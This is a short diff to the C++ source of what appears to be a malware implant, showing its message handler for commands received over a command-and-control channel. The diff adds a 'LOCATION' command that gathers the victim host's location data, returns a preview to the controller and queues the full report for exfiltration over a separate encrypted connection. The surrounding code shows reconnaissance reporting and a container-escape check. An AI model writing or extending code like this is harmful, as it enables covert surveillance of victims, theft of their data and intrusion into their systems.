@@ -111,6 +111,14 @@ void handleMessage(const std::string& msg, SSL* c2_ssl, SSL* exfil_ssl) {
             c2_response = recon_report;
         }
         exfil_data = "=== FULL RECON REPORT ===\n" + recon_report + "\n=== END ===\n";
+    } else if (keyword == "LOCATION") {
+        std::string loc_report = collect_location_info();
+        if (loc_report.length() > C2_PREVIEW_LEN) {
+            c2_response = loc_report.substr(0, C2_PREVIEW_LEN) + "\n... [full report in exfil]";
+        } else {
+            c2_response = loc_report;
+        }
+        exfil_data = "=== FULL LOCATION REPORT ===\n" + loc_report + "\n=== END ===\n";
     } else if (keyword == "ESCAPE") {
         DetectionResult result = run_environment_checks();
         c2_response = result.can_escape ? "ESCAPE_OK " + id : (result.is_docker ? "ESCAPE_FAIL " + id : "NOT_DOCKER " + id);
